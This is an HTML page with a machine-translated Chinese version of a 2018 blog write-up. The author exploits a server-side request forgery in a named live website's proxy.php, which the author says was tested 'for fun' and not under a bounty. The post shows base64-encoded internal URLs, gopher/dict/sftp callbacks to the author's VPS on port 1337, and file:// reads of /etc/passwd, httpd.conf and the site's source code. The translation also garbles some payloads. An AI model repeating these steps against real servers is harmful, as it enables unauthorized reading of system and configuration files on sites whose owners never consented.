<html>
<head>
<title>Server Side Request Forgery (SSRF) Testing</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">服务器端请求伪造(SSRF)测试</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/server-side-request-forgery-ssrf-testing-b9dfe57cca35?source=collection_archive---------4-----------------------#2018-06-26">https://infosecwriteups.com/server-side-request-forgery-ssrf-testing-b9dfe57cca35?source=collection_archive---------4-----------------------#2018-06-26</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="e086" class="pw-post-body-paragraph jo jp iq jq b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl ij bi translated">这个故事只是为了好玩测试SSRF，而不是一个赏金写。我发现了一个易受SSRF攻击的随机网站，但为了利用它，我应该将我的输入转换为base64。这里是http://playfreedownloadgames.com:2483/proxy.php?的遗址<a class="ae km" href="http://playfreedownloadgames.com:2483/proxy.php?url=aHR0cDovL3d3dy50b3A4MHNnYW1lcy5jb20vc2l0ZS9jb250ZW50L3BhY21hbg==" rel="noopener ugc nofollow" target="_blank">URL = ahr 0 cdovl 3d 3d y 50 B3 a4 mhnnyw1 lcy 5 JB 20 VC 2 l0 zs 9 JB 250 zw 50 L3 bhy 21 hbg = =</a>。如果我解码base64，那么我得到了这个吃豆人游戏网站【http://www.top80sgames.com/site/content/pacman<a class="ae km" href="http://www.top80sgames.com/site/content/pacman" rel="noopener ugc nofollow" target="_blank"><strong class="jq ir"/></a>。</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi kn"><img src="../Images/53074dcdabe65920848c4f26f53c8b99.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*M-vh3VZsK6mPiSD-Bt4NrQ.png"/></div></div></figure><p id="33fe" class="pw-post-body-paragraph jo jp iq jq b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl ij bi translated">所以让我们用convert<a class="ae km" href="http://127.0.0.1:80" rel="noopener ugc nofollow" target="_blank"><strong class="jq ir">http://127 . 0 . 0 . 1:80</strong></a>到base64<strong class="jq ir">ahr 0 cdovlzeyny 4 wljaumto 4ma = =</strong>试一下，在burp repeater上运行。</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi kz"><img src="../Images/93d57045cdc57a1aeba7f3d406d02ee0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FmFei9baxToLMP2GtFghFg.png"/></div></div></figure><p id="ed29" class="pw-post-body-paragraph jo jp iq jq b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl ij bi translated">现在尝试使用端口443，看看它是什么样子。</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi la"><img src="../Images/42efb8704695f229a3e33c3f5d56c841.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EmBVJqjAeRXdhVEMKI8IBA.png"/></div></div></figure><p id="d59d" class="pw-post-body-paragraph jo jp iq jq b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl ij bi translated">因为我使用端口443请求HTTP，所以发生了错误请求。让我们试试gopher，dict和sftp。我将在我的VPS中监听1337端口。</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi lb"><img src="../Images/e4680c2d58f6918b0aeb7ca4b8a2c249.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ugzU0nJRVmLrmPe6YBszZg.png"/></div></div></figure><p id="46c9" class="pw-post-body-paragraph jo jp iq jq b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl ij bi translated">我尝试<strong class="jq ir">gopher://my _ VPS _ IP:1337/_ pacenoge</strong>，<strong class="jq ir"> dict://my_vps_ip:1337 </strong>和<strong class="jq ir"> sftp://my_vps_ip:1337 </strong>都执行成功。还有什么？试试<strong class="jq ir"> file:///etc/passwd </strong></p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi kz"><img src="../Images/befa856a41d1c6d79bf8d5ebfe7cfdea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*E2eJ34b367cbuxV6v9jlEQ.png"/></div></div></figure><p id="e381" class="pw-post-body-paragraph jo jp iq jq b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl ij bi translated">好的，我想看看<strong class="jq ir"> httpd.conf </strong>。默认路径是这个<strong class="jq ir">/etc/httpd/conf/httpd . conf</strong></p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi lc"><img src="../Images/b5606abba245304cc360f8d66c1a496d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-JWVkc2Aq8Yik_vLnOFM5g.png"/></div></div></figure><p id="08a0" class="pw-post-body-paragraph jo jp iq jq b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl ij bi translated">通过阅读<strong class="jq ir"> httpd.conf </strong>文件，我知道web路径<strong class="jq ir">/home/play free download games/public _ html</strong>，所以我想通过访问这里的<strong class="jq ir">/home/play free download games/public _ html/proxy . PHP</strong>来了解<strong class="jq ir">proxy.php</strong>的代码</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi kz"><img src="../Images/bccbbe9272cae50694285caf6e6a6c12.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5uBB2jL7yM8x7ZBLiGZoTQ.png"/></div></div></figure><p id="e675" class="pw-post-body-paragraph jo jp iq jq b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl ij bi translated">参考<a class="ae km" href="http://blog.orange.tw/" rel="noopener ugc nofollow" target="_blank">http://blog.orange.tw</a>和h1 SSRF的报道。就是这样。黑客快乐！:)</p></div></div>    
</body>
</html>